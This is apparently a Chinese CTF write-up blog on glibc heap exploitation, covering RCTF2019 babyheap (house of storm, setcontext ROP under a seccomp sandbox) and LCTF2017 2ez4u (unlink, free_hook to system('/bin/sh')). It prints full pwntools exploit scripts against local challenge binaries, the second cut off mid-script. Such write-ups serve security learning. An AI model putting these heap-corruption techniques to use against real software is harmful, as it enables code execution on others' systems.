<h3 id="RCTF2019-babyheap"><a href="#RCTF2019-babyheap" class="headerlink" title="RCTF2019 babyheap"></a>RCTF2019 babyheap</h3><p>这道题想解决的知识点：</p>
<blockquote>
<p>1.colloc的原理<br>2.house of strom</p>
</blockquote>
<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>用mallopt关闭了fastbin的分配<br>那就用large bin attack（也可以通过改global_max_fast来实现重新开启fastbin，这种方法会比较麻烦，这里重点讲largebin）</p>
<p>off by one的洞，开了沙箱，ban掉了execve，就只能orw<br>我们通过overlap来leak出libc的地址，然后构造chunk(size大于空闲块)，空闲块进入smallbin，然后就可以leak出heap的地址</p>
<h4 id="colloc"><a href="#colloc" class="headerlink" title="colloc"></a>colloc</h4><p>calloc申请堆块会对堆块进行清空</p>
<blockquote>
<p>函数calloc() 会将所分配的内存空间中的每一位都初始化为零<br>也就是说,如果你是为字符类型或整数类型的元素分配内存,那么这些元素将保证会被初始化为0;<br>如果你是为指针类型的元素分配内存,那么这些元素通常会被初始化为空指针;<br>如果你为实型数据分配内存,则这些元素会被初始化为浮点型的零.</p>
</blockquote>
<h4 id="house-of-storm"><a href="#house-of-storm" class="headerlink" title="house of storm"></a>house of storm</h4><p>随后large bin 操作，实现overlap，构造chunk改bk 和bk_nextsize(house of storm)<br>指向free_hook<br>然后我们在一个chunk里填入orw的rop链<br>再往free_hook里面填入setcontext+53的地址</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">40</span>si <span class="number">0x00007f52b004ab85</span></span><br><span class="line">   <span class="number">0x7f52b004ab85</span> &lt;setcontext+<span class="number">53</span>&gt;:	mov    rsp,QWORD PTR [rdi+<span class="number">0xa0</span>]</span><br><span class="line">   <span class="number">0x7f52b004ab8c</span> &lt;setcontext+<span class="number">60</span>&gt;:	mov    rbx,QWORD PTR [rdi+<span class="number">0x80</span>]</span><br><span class="line">   <span class="number">0x7f52b004ab93</span> &lt;setcontext+<span class="number">67</span>&gt;:	mov    rbp,QWORD PTR [rdi+<span class="number">0x78</span>]</span><br><span class="line">   <span class="number">0x7f52b004ab97</span> &lt;setcontext+<span class="number">71</span>&gt;:	mov    r12,QWORD PTR [rdi+<span class="number">0x48</span>]</span><br><span class="line">   <span class="number">0x7f52b004ab9b</span> &lt;setcontext+<span class="number">75</span>&gt;:	mov    r13,QWORD PTR [rdi+<span class="number">0x50</span>]</span><br><span class="line">   <span class="number">0x7f52b004ab9f</span> &lt;setcontext+<span class="number">79</span>&gt;:	mov    r14,QWORD PTR [rdi+<span class="number">0x58</span>]</span><br><span class="line">   <span class="number">0x7f52b004aba3</span> &lt;setcontext+<span class="number">83</span>&gt;:	mov    r15,QWORD PTR [rdi+<span class="number">0x60</span>]</span><br><span class="line">   <span class="number">0x7f52b004aba7</span> &lt;setcontext+<span class="number">87</span>&gt;:	mov    rcx,QWORD PTR [rdi+<span class="number">0xa8</span>]</span><br><span class="line">   <span class="number">0x7f52b004abae</span> &lt;setcontext+<span class="number">94</span>&gt;:	push   rcx</span><br><span class="line">   <span class="number">0x7f52b004abaf</span> &lt;setcontext+<span class="number">95</span>&gt;:	mov    rsi,QWORD PTR [rdi+<span class="number">0x70</span>]</span><br><span class="line">   <span class="number">0x7f52b004abb3</span> &lt;setcontext+<span class="number">99</span>&gt;:	mov    rdx,QWORD PTR [rdi+<span class="number">0x88</span>]</span><br><span class="line">   <span class="number">0x7f52b004abba</span> &lt;setcontext+<span class="number">106</span>&gt;:	mov    rcx,QWORD PTR [rdi+<span class="number">0x98</span>]</span><br><span class="line">   <span class="number">0x7f52b004abc1</span> &lt;setcontext+<span class="number">113</span>&gt;:	mov    r8,QWORD PTR [rdi+<span class="number">0x28</span>]</span><br><span class="line">   <span class="number">0x7f52b004abc5</span> &lt;setcontext+<span class="number">117</span>&gt;:	mov    r9,QWORD PTR [rdi+<span class="number">0x30</span>]</span><br><span class="line">   <span class="number">0x7f52b004abc9</span> &lt;setcontext+<span class="number">121</span>&gt;:	mov    rdi,QWORD PTR [rdi+<span class="number">0x68</span>]</span><br><span class="line">   <span class="number">0x7f52b004abcd</span> &lt;setcontext+<span class="number">125</span>&gt;:	xor    eax,eax</span><br><span class="line">   <span class="number">0x7f52b004abcf</span> &lt;setcontext+<span class="number">127</span>&gt;:	ret</span><br></pre></td></tr></table></figure>

<p>通过上面的gadget我们可以知道</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rdi在[rdi+<span class="number">0x68</span>]上</span><br><span class="line">rsp在[rdi+<span class="number">0xa0</span>]上</span><br></pre></td></tr></table></figure>

<p>我们依照相应的位置写入rop的数据<br>执行free操作的时候就可以调用rop链了</p>
<h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="comment"># context.terminal = ["tmux","split","-h"]</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./babyheap"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"Choice: "</span>)</span><br><span class="line">   p.sendline(<span class="string">'1'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">   p.send(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"Choice: "</span>)</span><br><span class="line">   p.sendline(<span class="string">'2'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">   p.sendline(str(idx))</span><br><span class="line">   p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">   p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"Choice: "</span>)</span><br><span class="line">   p.sendline(<span class="string">'3'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">   p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"Choice: "</span>)</span><br><span class="line">   p.sendline(<span class="string">'4'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">   p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#0 0x21</span></span><br><span class="line">add(<span class="number">0x28</span>) <span class="comment">#1 0x31</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x508</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">0</span>) </span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x20</span>+p64(<span class="number">0x50</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_address=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_address)</span><br><span class="line">free_hook = libc.symbols[<span class="string">"__free_hook"</span>]+libc_address</span><br><span class="line">fake_chunk = free_hook - <span class="number">0x20</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment">#11 -&gt; old chunk2-&gt;smallbin 0xe0</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#2 -&gt; chunk2 -&gt; smallbin</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0xe0</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_base)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">'a'</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x4d8</span>) <span class="comment">#14</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)<span class="comment"># --&gt;0x508</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>) </span><br><span class="line">add(<span class="number">0x4d0</span>)</span><br><span class="line"><span class="comment"># delete(8) #unsorted bin</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,<span class="string">'a'</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x4d8</span>)<span class="comment">#15</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">9</span>)<span class="comment"># free -&gt;chunk5 but chunk8 here</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment">#构造一个largebin 一个unsortedbin</span></span><br><span class="line">add(<span class="number">0x4e8</span>) <span class="comment">#chunk5-&gt;largebin </span></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment">#chunk2-&gt;unsortedbin</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x4f1</span>) + p64(<span class="number">0</span>) + p64(fake_chunk) +p64(<span class="number">0</span>)*<span class="number">2</span><span class="comment"># bk fackchunk-&gt;fd</span></span><br><span class="line">edit(<span class="number">14</span>,payload)</span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)   <span class="comment">#bk --&gt;fakechunk-&gt;bk</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk<span class="number">-0x18</span><span class="number">-5</span>)<span class="comment">#size 0x56</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">15</span>,payload2)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line"><span class="comment"># edit(8,p64(0)*3+p64(0x511))</span></span><br><span class="line">ret = libc_address+<span class="number">0x937</span></span><br><span class="line">p_rdi_r = libc_address+ <span class="number">0x21112</span> <span class="comment">#0x21102</span></span><br><span class="line">p_rsi_r = libc_address+ <span class="number">0x202f8</span> <span class="comment">#0x202e8</span></span><br><span class="line">p_rdx_r = libc_address+<span class="number">0x1b92</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop_chain = <span class="string">"flag"</span>.ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)+p64(<span class="number">0</span>)*<span class="number">12</span>+p64(heap_base+<span class="number">0x1c0</span>)   <span class="comment">#[rdi+0x68] is rdi</span></span><br><span class="line">rop_chain += p64(<span class="number">0</span>) <span class="comment">#[rdi+0x70] is rsi</span></span><br><span class="line">rop_chain += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>)  <span class="comment">#[rdi+0x88] is rdx</span></span><br><span class="line">rop_chain = rop_chain.ljust(<span class="number">0xa0</span>,<span class="string">"\x00"</span>)</span><br><span class="line">rop_chain += p64(heap_base+<span class="number">0x1c0</span>+<span class="number">0x100</span>)</span><br><span class="line">rop_chain += p64(libc.symbols[<span class="string">"open"</span>]+libc_address)</span><br><span class="line">rop_chain = rop_chain.ljust(<span class="number">0x100</span>,<span class="string">"\x00"</span>)</span><br><span class="line"><span class="comment">#now read and write</span></span><br><span class="line">rop_chain += p64(p_rdi_r)+p64(<span class="number">3</span>)+p64(p_rsi_r)+p64(heap_base+<span class="number">0x1c0</span>+<span class="number">0x200</span>)</span><br><span class="line">rop_chain += p64(p_rdx_r)+p64(<span class="number">0x100</span>)</span><br><span class="line">rop_chain += p64(libc.symbols[<span class="string">"read"</span>]+libc_address)</span><br><span class="line"></span><br><span class="line">rop_chain += p64(p_rdi_r)+p64(<span class="number">1</span>)+p64(p_rsi_r)+p64(heap_base+<span class="number">0x1c0</span>+<span class="number">0x200</span>)</span><br><span class="line">rop_chain += p64(p_rdx_r)+p64(<span class="number">0x100</span>)</span><br><span class="line">rop_chain += p64(libc.symbols[<span class="string">"write"</span>]+libc_address)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">14</span>,rop_chain)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,<span class="string">"A"</span>*<span class="number">0x10</span>+p64(libc.symbols[<span class="string">"setcontext"</span>]+<span class="number">53</span>+libc_address))</span><br><span class="line">delete(<span class="number">14</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://blog.rois.io/2019/rctf-2019-official-writeup/" target="_blank" rel="noopener">https://blog.rois.io/2019/rctf-2019-official-writeup/</a><br><a href="https://x3h1n.github.io/2019/05/26/RCTF-2019-babyheap/" target="_blank" rel="noopener">https://x3h1n.github.io/2019/05/26/RCTF-2019-babyheap/</a></p>
<h3 id="LCTF2017-2ez4u"><a href="#LCTF2017-2ez4u" class="headerlink" title="LCTF2017 2ez4u"></a>LCTF2017 2ez4u</h3><p>漏洞点是uaf<br>官方wp给的是largebin的操作<br>感觉看起来好复杂啊，调试也要调很久</p>
<p>用了unlink来控制堆块，然后两个smallbin绕过’\x00’，后面还将堆块劫持到main_arena上，多add几个大的chunk，到达freehook的位置，并赋值为system，然后再通过chunk1(unlink处理的chunk，overlap了很多个smallbin)，改chunk2的fd为’/bin/sh’,<code>free(2)-&gt;system(&#39;/bin/sh&#39;)</code></p>
<h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p=process(<span class="string">"./2ez4u"</span>)</span><br><span class="line">elf=ELF(<span class="string">'./2ez4u'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,desc,color=<span class="string">'0'</span>,value=<span class="string">'0'</span>,num=<span class="string">'0'</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"hoice: "</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"n):"</span>)</span><br><span class="line">    p.sendline(str(color))</span><br><span class="line">    p.recvuntil(<span class="string">"999):"</span>)</span><br><span class="line">    p.sendline(str(value))</span><br><span class="line">    p.recvuntil(<span class="string">"-16):"</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">"024):"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"apple:"</span>)</span><br><span class="line">    p.send(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,desc,color=<span class="string">'3'</span>,value=<span class="string">'1000'</span>,num=<span class="string">'100'</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"hoice: "</span>)</span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"0-15):"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"n):"</span>)</span><br><span class="line">    p.sendline(str(color))</span><br><span class="line">    p.recvuntil(<span class="string">"999):"</span>)</span><br><span class="line">    p.sendline(str(value))</span><br><span class="line">    p.recvuntil(<span class="string">"-16):"</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">"apple:"</span>)</span><br><span class="line">    p.send(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"hoice: "</span>)</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"0-15):"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"hoice: "</span>)</span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"0-15):"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">'a\n'</span>) <span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">'a\n'</span>) <span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">'b\n'</span>) <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x3e0</span>,<span class="string">"a\n"</span>) <span class="comment">#3</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">"a\n"</span>)  <span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x3f0</span>,<span class="string">"a\n"</span>) <span class="comment">#5</span></span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">"a\n"</span>)  <span class="comment">#6</span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">'a\n'</span>)  <span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">'a\n'</span>)  <span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">'a\n'</span>) <span class="comment">#9</span></span><br><span class="line">    add(<span class="number">0x290</span>,<span class="string">'b\n'</span>) <span class="comment">#10</span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">'a\n'</span>) <span class="comment">#11</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x400</span>,<span class="string">"a\n"</span>) <span class="comment">#0</span></span><br><span class="line">    show(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"description:"</span>)</span><br><span class="line">    heap_base=u64(p.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x4e0</span><span class="number">-0x30</span></span><br><span class="line">    <span class="keyword">print</span> hex(heap_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    unlink_addr=heap_base+<span class="number">0x58</span> <span class="comment">#chunk1-&gt;bk_nextsize</span></span><br><span class="line">    fake_large=heap_base+<span class="number">0x910</span>+<span class="number">0x30</span>   <span class="comment">#0x940 chunk6</span></span><br><span class="line">    payload=p64(<span class="number">0x411</span>)+p64(unlink_addr<span class="number">-0x18</span>)+p64(unlink_addr<span class="number">-0x10</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">1</span>,p64(fake_large)+<span class="string">'\n'</span>) <span class="comment">## write large bin address to bypass unlink the largebin</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#chunk6-10构成的fake_chunk</span></span><br><span class="line">    edit(<span class="number">6</span>,payload+<span class="string">"\n"</span>)</span><br><span class="line">    edit(<span class="number">10</span>,<span class="string">'a'</span>*<span class="number">0x218</span>+p64(<span class="number">0x410</span>)+p64(<span class="number">0x70</span>)+<span class="string">'\n'</span>)  <span class="comment">#chunk6-10构成的fake_chunk</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    <span class="comment"># log.info("fake large bin: %s"%hex(fake_large))</span></span><br><span class="line">    payload=p64(fake_large)+<span class="string">'\n'</span></span><br><span class="line">    edit(<span class="number">3</span>,payload) <span class="comment">#chunk3‘s bk_nextsize</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)  <span class="comment">## unlink   clear 1st to avoid overwrite the 3rd ptr</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">11</span>)</span><br><span class="line">    delete(<span class="number">7</span>)   